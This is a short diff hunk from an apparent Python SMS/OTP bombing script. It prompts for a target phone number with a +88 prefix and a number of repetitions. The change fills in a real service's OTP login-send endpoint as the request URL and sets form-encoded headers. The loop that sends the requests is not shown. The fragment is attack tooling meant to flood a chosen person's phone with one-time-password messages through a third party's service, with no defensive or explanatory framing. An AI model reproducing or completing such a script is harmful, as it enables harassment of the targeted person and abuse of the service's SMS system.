@@ -24,7 +24,7 @@ fegalt"ASB"
                                                         
 number=str(input("Enter Terget Number:+88 "))
 amount=int(input("Enter Terget Amount: "))
-url = ""
+url = "https://ss.binge.buzz/otp/send/login"
 
 headers = CaseInsensitiveDict()
 headers["Content-Type"] = "application/x-www-form-urlencoded"
